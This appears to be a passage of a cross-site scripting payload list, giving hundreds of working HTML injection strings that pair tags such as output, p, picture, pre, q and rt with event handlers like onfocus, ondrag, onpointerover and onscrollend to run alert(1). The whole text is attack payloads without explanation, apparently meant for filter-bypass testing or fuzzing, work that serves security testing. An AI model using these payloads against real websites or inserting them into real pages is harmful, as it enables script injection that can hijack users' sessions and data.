<output draggable="true" ondrag="alert(1)" style=display:block>test</output>
<output draggable="true" ondragend="alert(1)" style=display:block>test</output>
<output draggable="true" ondragenter="alert(1)" style=display:block>test</output>
<output draggable="true" ondragleave="alert(1)" style=display:block>test</output>
<output draggable="true" ondragstart="alert(1)" style=display:block>test</output>
<output id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></output>
<output id=x tabindex=1 onfocus=alert(1)></output>
<output id=x tabindex=1 onfocusin=alert(1)></output>
<output onafterscriptexecute=alert(1)><script>1</script>
<output onbeforecopy="alert(1)" contenteditable>test</output>
<output onbeforecut="alert(1)" contenteditable>test</output>
<output onbeforescriptexecute=alert(1)><script>1</script>
<output onblur=alert(1) id=x tabindex=1 style=display:block>test</output><input value=clickme>
<output onclick="alert(1)" style=display:block>test</output>
<output oncontextmenu="alert(1)" style=display:block>test</output>
<output oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<output oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<output ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</output>
<output onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</output><input value=clickme>
<output onkeydown="alert(1)" contenteditable style=display:block>test</output>
<output onkeypress="alert(1)" contenteditable style=display:block>test</output>
<output onkeyup="alert(1)" contenteditable style=display:block>test</output>
<output onmousedown="alert(1)" style=display:block>test</output>
<output onmouseenter="alert(1)" style=display:block>test</output>
<output onmouseleave="alert(1)" style=display:block>test</output>
<output onmousemove="alert(1)" style=display:block>test</output>
<output onmouseout="alert(1)" style=display:block>test</output>
<output onmouseover="alert(1)" style=display:block>test</output>
<output onmouseup="alert(1)" style=display:block>test</output>
<output onmousewheel=alert(1) style=display:block>requires scrolling
<output onpaste="alert(1)" contenteditable>test</output>
<output onpointerdown=alert(1) style=display:block>XSS</output>
<output onpointerenter=alert(1) style=display:block>XSS</output>
<output onpointerleave=alert(1) style=display:block>XSS</output>
<output onpointermove=alert(1) style=display:block>XSS</output>
<output onpointerout=alert(1) style=display:block>XSS</output>
<output onpointerover=alert(1) style=display:block>XSS</output>
<output onpointerrawupdate=alert(1) style=display:block>XSS</output>
<output onpointerup=alert(1) style=display:block>XSS</output>
<output onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></output>
<p contenteditable onbeforeinput=alert(1)>test
<p draggable="true" ondrag="alert(1)" style=display:block>test</p>
<p draggable="true" ondragend="alert(1)" style=display:block>test</p>
<p draggable="true" ondragenter="alert(1)" style=display:block>test</p>
<p draggable="true" ondragleave="alert(1)" style=display:block>test</p>
<p draggable="true" ondragstart="alert(1)" style=display:block>test</p>
<p id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></p>
<p id=x tabindex=1 onfocus=alert(1)></p>
<p id=x tabindex=1 onfocusin=alert(1)></p>
<p onafterscriptexecute=alert(1)><script>1</script>
<p onbeforecopy="alert(1)" contenteditable>test</p>
<p onbeforecut="alert(1)" contenteditable>test</p>
<p onbeforescriptexecute=alert(1)><script>1</script>
<p onblur=alert(1) id=x tabindex=1 style=display:block>test</p><input value=clickme>
<p onclick="alert(1)" style=display:block>test</p>
<p oncontextmenu="alert(1)" style=display:block>test</p>
<p oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<p oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<p ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</p>
<p onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</p><input value=clickme>
<p onkeydown="alert(1)" contenteditable style=display:block>test</p>
<p onkeypress="alert(1)" contenteditable style=display:block>test</p>
<p onkeyup="alert(1)" contenteditable style=display:block>test</p>
<p onmousedown="alert(1)" style=display:block>test</p>
<p onmouseenter="alert(1)" style=display:block>test</p>
<p onmouseleave="alert(1)" style=display:block>test</p>
<p onmousemove="alert(1)" style=display:block>test</p>
<p onmouseout="alert(1)" style=display:block>test</p>
<p onmouseover="alert(1)" style=display:block>test</p>
<p onmouseup="alert(1)" style=display:block>test</p>
<p onmousewheel=alert(1) style=display:block>requires scrolling
<p onpaste="alert(1)" contenteditable>test</p>
<p onpointerdown=alert(1) style=display:block>XSS</p>
<p onpointerenter=alert(1) style=display:block>XSS</p>
<p onpointerleave=alert(1) style=display:block>XSS</p>
<p onpointermove=alert(1) style=display:block>XSS</p>
<p onpointerout=alert(1) style=display:block>XSS</p>
<p onpointerover=alert(1) style=display:block>XSS</p>
<p onpointerrawupdate=alert(1) style=display:block>XSS</p>
<p onpointerup=alert(1) style=display:block>XSS</p>
<p onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></p>
<param contenteditable onbeforeinput=alert(1)>test
<param draggable="true" ondrag="alert(1)" style=display:block>test</param>
<param draggable="true" ondragend="alert(1)" style=display:block>test</param>
<param draggable="true" ondragenter="alert(1)" style=display:block>test</param>
<param draggable="true" ondragleave="alert(1)" style=display:block>test</param>
<param draggable="true" ondragstart="alert(1)" style=display:block>test</param>
<param id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></param>
<param id=x tabindex=1 onfocus=alert(1)></param>
<param id=x tabindex=1 onfocusin=alert(1)></param>
<param onafterscriptexecute=alert(1)><script>1</script>
<param onbeforecopy="alert(1)" contenteditable>test</param>
<param onbeforecut="alert(1)" contenteditable>test</param>
<param onbeforescriptexecute=alert(1)><script>1</script>
<param onblur=alert(1) id=x tabindex=1 style=display:block>test</param><input value=clickme>
<param onclick="alert(1)" style=display:block>test</param>
<param oncontextmenu="alert(1)" style=display:block>test</param>
<param oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<param oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<param ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</param>
<param onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</param><input value=clickme>
<param onkeydown="alert(1)" contenteditable style=display:block>test</param>
<param onkeypress="alert(1)" contenteditable style=display:block>test</param>
<param onkeyup="alert(1)" contenteditable style=display:block>test</param>
<param onmousedown="alert(1)" style=display:block>test</param>
<param onmouseenter="alert(1)" style=display:block>test</param>
<param onmouseleave="alert(1)" style=display:block>test</param>
<param onmousemove="alert(1)" style=display:block>test</param>
<param onmouseout="alert(1)" style=display:block>test</param>
<param onmouseover="alert(1)" style=display:block>test</param>
<param onmouseup="alert(1)" style=display:block>test</param>
<param onmousewheel=alert(1) style=display:block>requires scrolling
<param onpaste="alert(1)" contenteditable>test</param>
<param onpointerdown=alert(1) style=display:block>XSS</param>
<param onpointerenter=alert(1) style=display:block>XSS</param>
<param onpointerleave=alert(1) style=display:block>XSS</param>
<param onpointermove=alert(1) style=display:block>XSS</param>
<param onpointerout=alert(1) style=display:block>XSS</param>
<param onpointerover=alert(1) style=display:block>XSS</param>
<param onpointerrawupdate=alert(1) style=display:block>XSS</param>
<param onpointerup=alert(1) style=display:block>XSS</param>
<param onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></param>
<picture contenteditable onbeforeinput=alert(1)>test
<picture draggable="true" ondrag="alert(1)" style=display:block>test</picture>
<picture draggable="true" ondragend="alert(1)" style=display:block>test</picture>
<picture draggable="true" ondragenter="alert(1)" style=display:block>test</picture>
<picture draggable="true" ondragleave="alert(1)" style=display:block>test</picture>
<picture draggable="true" ondragstart="alert(1)" style=display:block>test</picture>
<picture id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></picture>
<picture id=x tabindex=1 onfocus=alert(1)></picture>
<picture id=x tabindex=1 onfocusin=alert(1)></picture>
<picture onafterscriptexecute=alert(1)><script>1</script>
<picture onbeforecopy="alert(1)" contenteditable>test</picture>
<picture onbeforecut="alert(1)" contenteditable>test</picture>
<picture onbeforescriptexecute=alert(1)><script>1</script>
<picture onblur=alert(1) id=x tabindex=1 style=display:block>test</picture><input value=clickme>
<picture onclick="alert(1)" style=display:block>test</picture>
<picture oncontextmenu="alert(1)" style=display:block>test</picture>
<picture oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<picture oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<picture ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</picture>
<picture onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</picture><input value=clickme>
<picture onkeydown="alert(1)" contenteditable style=display:block>test</picture>
<picture onkeypress="alert(1)" contenteditable style=display:block>test</picture>
<picture onkeyup="alert(1)" contenteditable style=display:block>test</picture>
<picture onmousedown="alert(1)" style=display:block>test</picture>
<picture onmouseenter="alert(1)" style=display:block>test</picture>
<picture onmouseleave="alert(1)" style=display:block>test</picture>
<picture onmousemove="alert(1)" style=display:block>test</picture>
<picture onmouseout="alert(1)" style=display:block>test</picture>
<picture onmouseover="alert(1)" style=display:block>test</picture>
<picture onmouseup="alert(1)" style=display:block>test</picture>
<picture onmousewheel=alert(1) style=display:block>requires scrolling
<picture onpaste="alert(1)" contenteditable>test</picture>
<picture onpointerdown=alert(1) style=display:block>XSS</picture>
<picture onpointerenter=alert(1) style=display:block>XSS</picture>
<picture onpointerleave=alert(1) style=display:block>XSS</picture>
<picture onpointermove=alert(1) style=display:block>XSS</picture>
<picture onpointerout=alert(1) style=display:block>XSS</picture>
<picture onpointerover=alert(1) style=display:block>XSS</picture>
<picture onpointerrawupdate=alert(1) style=display:block>XSS</picture>
<picture onpointerup=alert(1) style=display:block>XSS</picture>
<picture onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></picture>
<picture><source srcset="validimage.png"><image onload=alert(1)></picture>
<picture><source srcset="validimage.png"><img onload=alert(1)></picture>
<plaintext contenteditable onbeforeinput=alert(1)>test
<plaintext draggable="true" ondrag="alert(1)" style=display:block>test</plaintext>
<plaintext draggable="true" ondragend="alert(1)" style=display:block>test</plaintext>
<plaintext draggable="true" ondragenter="alert(1)" style=display:block>test</plaintext>
<plaintext draggable="true" ondragleave="alert(1)" style=display:block>test</plaintext>
<plaintext draggable="true" ondragstart="alert(1)" style=display:block>test</plaintext>
<plaintext id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></plaintext>
<plaintext id=x tabindex=1 onfocus=alert(1)></plaintext>
<plaintext id=x tabindex=1 onfocusin=alert(1)></plaintext>
<plaintext onafterscriptexecute=alert(1)><script>1</script>
<plaintext onbeforecopy="alert(1)" contenteditable>test</plaintext>
<plaintext onbeforecut="alert(1)" contenteditable>test</plaintext>
<plaintext onbeforescriptexecute=alert(1)><script>1</script>
<plaintext onblur=alert(1) id=x tabindex=1 style=display:block>test</plaintext><input value=clickme>
<plaintext onclick="alert(1)" style=display:block>test</plaintext>
<plaintext oncontextmenu="alert(1)" style=display:block>test</plaintext>
<plaintext oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<plaintext oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<plaintext ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</plaintext>
<plaintext onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</plaintext><input value=clickme>
<plaintext onkeydown="alert(1)" contenteditable style=display:block>test</plaintext>
<plaintext onkeypress="alert(1)" contenteditable style=display:block>test</plaintext>
<plaintext onkeyup="alert(1)" contenteditable style=display:block>test</plaintext>
<plaintext onmousedown="alert(1)" style=display:block>test</plaintext>
<plaintext onmouseenter="alert(1)" style=display:block>test</plaintext>
<plaintext onmouseleave="alert(1)" style=display:block>test</plaintext>
<plaintext onmousemove="alert(1)" style=display:block>test</plaintext>
<plaintext onmouseout="alert(1)" style=display:block>test</plaintext>
<plaintext onmouseover="alert(1)" style=display:block>test</plaintext>
<plaintext onmouseup="alert(1)" style=display:block>test</plaintext>
<plaintext onmousewheel=alert(1) style=display:block>requires scrolling
<plaintext onpaste="alert(1)" contenteditable>test</plaintext>
<plaintext onpointerdown=alert(1) style=display:block>XSS</plaintext>
<plaintext onpointerenter=alert(1) style=display:block>XSS</plaintext>
<plaintext onpointerleave=alert(1) style=display:block>XSS</plaintext>
<plaintext onpointermove=alert(1) style=display:block>XSS</plaintext>
<plaintext onpointerout=alert(1) style=display:block>XSS</plaintext>
<plaintext onpointerover=alert(1) style=display:block>XSS</plaintext>
<plaintext onpointerrawupdate=alert(1) style=display:block>XSS</plaintext>
<plaintext onpointerup=alert(1) style=display:block>XSS</plaintext>
<plaintext onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></plaintext>
<pre contenteditable onbeforeinput=alert(1)>test
<pre draggable="true" ondrag="alert(1)" style=display:block>test</pre>
<pre draggable="true" ondragend="alert(1)" style=display:block>test</pre>
<pre draggable="true" ondragenter="alert(1)" style=display:block>test</pre>
<pre draggable="true" ondragleave="alert(1)" style=display:block>test</pre>
<pre draggable="true" ondragstart="alert(1)" style=display:block>test</pre>
<pre id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></pre>
<pre id=x tabindex=1 onfocus=alert(1)></pre>
<pre id=x tabindex=1 onfocusin=alert(1)></pre>
<pre onafterscriptexecute=alert(1)><script>1</script>
<pre onbeforecopy="alert(1)" contenteditable>test</pre>
<pre onbeforecut="alert(1)" contenteditable>test</pre>
<pre onbeforescriptexecute=alert(1)><script>1</script>
<pre onblur=alert(1) id=x tabindex=1 style=display:block>test</pre><input value=clickme>
<pre onclick="alert(1)" style=display:block>test</pre>
<pre oncontextmenu="alert(1)" style=display:block>test</pre>
<pre oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<pre oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<pre ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</pre>
<pre onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</pre><input value=clickme>
<pre onkeydown="alert(1)" contenteditable style=display:block>test</pre>
<pre onkeypress="alert(1)" contenteditable style=display:block>test</pre>
<pre onkeyup="alert(1)" contenteditable style=display:block>test</pre>
<pre onmousedown="alert(1)" style=display:block>test</pre>
<pre onmouseenter="alert(1)" style=display:block>test</pre>
<pre onmouseleave="alert(1)" style=display:block>test</pre>
<pre onmousemove="alert(1)" style=display:block>test</pre>
<pre onmouseout="alert(1)" style=display:block>test</pre>
<pre onmouseover="alert(1)" style=display:block>test</pre>
<pre onmouseup="alert(1)" style=display:block>test</pre>
<pre onmousewheel=alert(1) style=display:block>requires scrolling
<pre onpaste="alert(1)" contenteditable>test</pre>
<pre onpointerdown=alert(1) style=display:block>XSS</pre>
<pre onpointerenter=alert(1) style=display:block>XSS</pre>
<pre onpointerleave=alert(1) style=display:block>XSS</pre>
<pre onpointermove=alert(1) style=display:block>XSS</pre>
<pre onpointerout=alert(1) style=display:block>XSS</pre>
<pre onpointerover=alert(1) style=display:block>XSS</pre>
<pre onpointerrawupdate=alert(1) style=display:block>XSS</pre>
<pre onpointerup=alert(1) style=display:block>XSS</pre>
<pre onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></pre>
<progress contenteditable onbeforeinput=alert(1)>test
<progress draggable="true" ondrag="alert(1)" style=display:block>test</progress>
<progress draggable="true" ondragend="alert(1)" style=display:block>test</progress>
<progress draggable="true" ondragenter="alert(1)" style=display:block>test</progress>
<progress draggable="true" ondragleave="alert(1)" style=display:block>test</progress>
<progress draggable="true" ondragstart="alert(1)" style=display:block>test</progress>
<progress id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></progress>
<progress id=x tabindex=1 onfocus=alert(1)></progress>
<progress id=x tabindex=1 onfocusin=alert(1)></progress>
<progress onafterscriptexecute=alert(1)><script>1</script>
<progress onbeforecopy="alert(1)" contenteditable>test</progress>
<progress onbeforecut="alert(1)" contenteditable>test</progress>
<progress onbeforescriptexecute=alert(1)><script>1</script>
<progress onblur=alert(1) id=x tabindex=1 style=display:block>test</progress><input value=clickme>
<progress onclick="alert(1)" style=display:block>test</progress>
<progress oncontextmenu="alert(1)" style=display:block>test</progress>
<progress oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<progress oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<progress ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</progress>
<progress onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</progress><input value=clickme>
<progress onkeydown="alert(1)" contenteditable style=display:block>test</progress>
<progress onkeypress="alert(1)" contenteditable style=display:block>test</progress>
<progress onkeyup="alert(1)" contenteditable style=display:block>test</progress>
<progress onmousedown="alert(1)" style=display:block>test</progress>
<progress onmouseenter="alert(1)" style=display:block>test</progress>
<progress onmouseleave="alert(1)" style=display:block>test</progress>
<progress onmousemove="alert(1)" style=display:block>test</progress>
<progress onmouseout="alert(1)" style=display:block>test</progress>
<progress onmouseover="alert(1)" style=display:block>test</progress>
<progress onmouseup="alert(1)" style=display:block>test</progress>
<progress onmousewheel=alert(1) style=display:block>requires scrolling
<progress onpaste="alert(1)" contenteditable>test</progress>
<progress onpointerdown=alert(1) style=display:block>XSS</progress>
<progress onpointerenter=alert(1) style=display:block>XSS</progress>
<progress onpointerleave=alert(1) style=display:block>XSS</progress>
<progress onpointermove=alert(1) style=display:block>XSS</progress>
<progress onpointerout=alert(1) style=display:block>XSS</progress>
<progress onpointerover=alert(1) style=display:block>XSS</progress>
<progress onpointerrawupdate=alert(1) style=display:block>XSS</progress>
<progress onpointerup=alert(1) style=display:block>XSS</progress>
<progress onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></progress>
<q contenteditable onbeforeinput=alert(1)>test
<q draggable="true" ondrag="alert(1)" style=display:block>test</q>
<q draggable="true" ondragend="alert(1)" style=display:block>test</q>
<q draggable="true" ondragenter="alert(1)" style=display:block>test</q>
<q draggable="true" ondragleave="alert(1)" style=display:block>test</q>
<q draggable="true" ondragstart="alert(1)" style=display:block>test</q>
<q id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></q>
<q id=x tabindex=1 onfocus=alert(1)></q>
<q id=x tabindex=1 onfocusin=alert(1)></q>
<q onafterscriptexecute=alert(1)><script>1</script>
<q onbeforecopy="alert(1)" contenteditable>test</q>
<q onbeforecut="alert(1)" contenteditable>test</q>
<q onbeforescriptexecute=alert(1)><script>1</script>
<q onblur=alert(1) id=x tabindex=1 style=display:block>test</q><input value=clickme>
<q onclick="alert(1)" style=display:block>test</q>
<q oncontextmenu="alert(1)" style=display:block>test</q>
<q oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<q oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<q ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</q>
<q onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</q><input value=clickme>
<q onkeydown="alert(1)" contenteditable style=display:block>test</q>
<q onkeypress="alert(1)" contenteditable style=display:block>test</q>
<q onkeyup="alert(1)" contenteditable style=display:block>test</q>
<q onmousedown="alert(1)" style=display:block>test</q>
<q onmouseenter="alert(1)" style=display:block>test</q>
<q onmouseleave="alert(1)" style=display:block>test</q>
<q onmousemove="alert(1)" style=display:block>test</q>
<q onmouseout="alert(1)" style=display:block>test</q>
<q onmouseover="alert(1)" style=display:block>test</q>
<q onmouseup="alert(1)" style=display:block>test</q>
<q onmousewheel=alert(1) style=display:block>requires scrolling
<q onpaste="alert(1)" contenteditable>test</q>
<q onpointerdown=alert(1) style=display:block>XSS</q>
<q onpointerenter=alert(1) style=display:block>XSS</q>
<q onpointerleave=alert(1) style=display:block>XSS</q>
<q onpointermove=alert(1) style=display:block>XSS</q>
<q onpointerout=alert(1) style=display:block>XSS</q>
<q onpointerover=alert(1) style=display:block>XSS</q>
<q onpointerrawupdate=alert(1) style=display:block>XSS</q>
<q onpointerup=alert(1) style=display:block>XSS</q>
<q onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></q>
<rb contenteditable onbeforeinput=alert(1)>test
<rb draggable="true" ondrag="alert(1)" style=display:block>test</rb>
<rb draggable="true" ondragend="alert(1)" style=display:block>test</rb>
<rb draggable="true" ondragenter="alert(1)" style=display:block>test</rb>
<rb draggable="true" ondragleave="alert(1)" style=display:block>test</rb>
<rb draggable="true" ondragstart="alert(1)" style=display:block>test</rb>
<rb id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></rb>
<rb id=x tabindex=1 onfocus=alert(1)></rb>
<rb id=x tabindex=1 onfocusin=alert(1)></rb>
<rb onafterscriptexecute=alert(1)><script>1</script>
<rb onbeforecopy="alert(1)" contenteditable>test</rb>
<rb onbeforecut="alert(1)" contenteditable>test</rb>
<rb onbeforescriptexecute=alert(1)><script>1</script>
<rb onblur=alert(1) id=x tabindex=1 style=display:block>test</rb><input value=clickme>
<rb onclick="alert(1)" style=display:block>test</rb>
<rb oncontextmenu="alert(1)" style=display:block>test</rb>
<rb oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<rb oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<rb ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</rb>
<rb onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</rb><input value=clickme>
<rb onkeydown="alert(1)" contenteditable style=display:block>test</rb>
<rb onkeypress="alert(1)" contenteditable style=display:block>test</rb>
<rb onkeyup="alert(1)" contenteditable style=display:block>test</rb>
<rb onmousedown="alert(1)" style=display:block>test</rb>
<rb onmouseenter="alert(1)" style=display:block>test</rb>
<rb onmouseleave="alert(1)" style=display:block>test</rb>
<rb onmousemove="alert(1)" style=display:block>test</rb>
<rb onmouseout="alert(1)" style=display:block>test</rb>
<rb onmouseover="alert(1)" style=display:block>test</rb>
<rb onmouseup="alert(1)" style=display:block>test</rb>
<rb onmousewheel=alert(1) style=display:block>requires scrolling
<rb onpaste="alert(1)" contenteditable>test</rb>
<rb onpointerdown=alert(1) style=display:block>XSS</rb>
<rb onpointerenter=alert(1) style=display:block>XSS</rb>
<rb onpointerleave=alert(1) style=display:block>XSS</rb>
<rb onpointermove=alert(1) style=display:block>XSS</rb>
<rb onpointerout=alert(1) style=display:block>XSS</rb>
<rb onpointerover=alert(1) style=display:block>XSS</rb>
<rb onpointerrawupdate=alert(1) style=display:block>XSS</rb>
<rb onpointerup=alert(1) style=display:block>XSS</rb>
<rb onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></rb>
<rp contenteditable onbeforeinput=alert(1)>test
<rp draggable="true" ondrag="alert(1)" style=display:block>test</rp>
<rp draggable="true" ondragend="alert(1)" style=display:block>test</rp>
<rp draggable="true" ondragenter="alert(1)" style=display:block>test</rp>
<rp draggable="true" ondragleave="alert(1)" style=display:block>test</rp>
<rp draggable="true" ondragstart="alert(1)" style=display:block>test</rp>
<rp id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></rp>
<rp id=x tabindex=1 onfocus=alert(1)></rp>
<rp id=x tabindex=1 onfocusin=alert(1)></rp>
<rp onafterscriptexecute=alert(1)><script>1</script>
<rp onbeforecopy="alert(1)" contenteditable>test</rp>
<rp onbeforecut="alert(1)" contenteditable>test</rp>
<rp onbeforescriptexecute=alert(1)><script>1</script>
<rp onblur=alert(1) id=x tabindex=1 style=display:block>test</rp><input value=clickme>
<rp onclick="alert(1)" style=display:block>test</rp>
<rp oncontextmenu="alert(1)" style=display:block>test</rp>
<rp oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<rp oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<rp ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</rp>
<rp onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</rp><input value=clickme>
<rp onkeydown="alert(1)" contenteditable style=display:block>test</rp>
<rp onkeypress="alert(1)" contenteditable style=display:block>test</rp>
<rp onkeyup="alert(1)" contenteditable style=display:block>test</rp>
<rp onmousedown="alert(1)" style=display:block>test</rp>
<rp onmouseenter="alert(1)" style=display:block>test</rp>
<rp onmouseleave="alert(1)" style=display:block>test</rp>
<rp onmousemove="alert(1)" style=display:block>test</rp>
<rp onmouseout="alert(1)" style=display:block>test</rp>
<rp onmouseover="alert(1)" style=display:block>test</rp>
<rp onmouseup="alert(1)" style=display:block>test</rp>
<rp onmousewheel=alert(1) style=display:block>requires scrolling
<rp onpaste="alert(1)" contenteditable>test</rp>
<rp onpointerdown=alert(1) style=display:block>XSS</rp>
<rp onpointerenter=alert(1) style=display:block>XSS</rp>
<rp onpointerleave=alert(1) style=display:block>XSS</rp>
<rp onpointermove=alert(1) style=display:block>XSS</rp>
<rp onpointerout=alert(1) style=display:block>XSS</rp>
<rp onpointerover=alert(1) style=display:block>XSS</rp>
<rp onpointerrawupdate=alert(1) style=display:block>XSS</rp>
<rp onpointerup=alert(1) style=display:block>XSS</rp>
<rp onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></rp>
<rt contenteditable onbeforeinput=alert(1)>test
<rt draggable="true" ondrag="alert(1)" style=display:block>test</rt>
<rt draggable="true" ondragend="alert(1)" style=display:block>test</rt>
<rt draggable="true" ondragenter="alert(1)" style=display:block>test</rt>
<rt draggable="true" ondragleave="alert(1)" style=display:block>test</rt>
<rt draggable="true" ondragstart="alert(1)" style=display:block>test</rt>
<rt id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></rt>
<rt id=x tabindex=1 onfocus=alert(1)></rt>
<rt id=x tabindex=1 onfocusin=alert(1)></rt>
<rt onafterscriptexecute=alert(1)><script>1</script>
<rt onbeforecopy="alert(1)" contenteditable>test</rt>
<rt onbeforecut="alert(1)" contenteditable>test</rt>
<rt onbeforescriptexecute=alert(1)><script>1</script>
<rt onblur=alert(1) id=x tabindex=1 style=display:block>test</rt><input value=clickme>
<rt onclick="alert(1)" style=display:block>test</rt>
<rt oncontextmenu="alert(1)" style=display:block>test</rt>
<rt oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<rt oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<rt ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</rt>
<rt onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</rt><input value=clickme>
<rt onkeydown="alert(1)" contenteditable style=display:block>test</rt>
<rt onkeypress="alert(1)" contenteditable style=display:block>test</rt>
<rt onkeyup="alert(1)" contenteditable style=display:block>test</rt>
<rt onmousedown="alert(1)" style=display:block>test</rt>
<rt onmouseenter="alert(1)" style=display:block>test</rt>
<rt onmouseleave="alert(1)" style=display:block>test</rt>
<rt onmousemove="alert(1)" style=display:block>test</rt>
<rt onmouseout="alert(1)" style=display:block>test</rt>
<rt onmouseover="alert(1)" style=display:block>test</rt>
<rt onmouseup="alert(1)" style=display:block>test</rt>
<rt onmousewheel=alert(1) style=display:block>requires scrolling
<rt onpaste="alert(1)" contenteditable>test</rt>
<rt onpointerdown=alert(1) style=display:block>XSS</rt>
<rt onpointerenter=alert(1) style=display:block>XSS</rt>
<rt onpointerleave=alert(1) style=display:block>XSS</rt>
<rt onpointermove=alert(1) style=display:block>XSS</rt>
<rt onpointerout=alert(1) style=display:block>XSS</rt>
<rt onpointerover=alert(1) style=display:block>XSS</rt>
<rt onpointerrawupdate=alert(1) style=display:block>XSS</rt>
<rt onpointerup=alert(1) style=display:block>XSS</rt>
<rt onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></rt>
<rtc contenteditable onbeforeinput=alert(1)>test
<rtc draggable="true" ondrag="alert(1)" style=display:block>test</rtc>
<rtc draggable="true" ondragend="alert(1)" style=display:block>test</rtc>
<rtc draggable="true" ondragenter="alert(1)" style=display:block>test</rtc>
<rtc draggable="true" ondragleave="alert(1)" style=display:block>test</rtc>
<rtc draggable="true" ondragstart="alert(1)" style=display:block>test</rtc>
<rtc id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></rtc>
<rtc id=x tabindex=1 onfocus=alert(1)></rtc>
<rtc id=x tabindex=1 onfocusin=alert(1)></rtc>
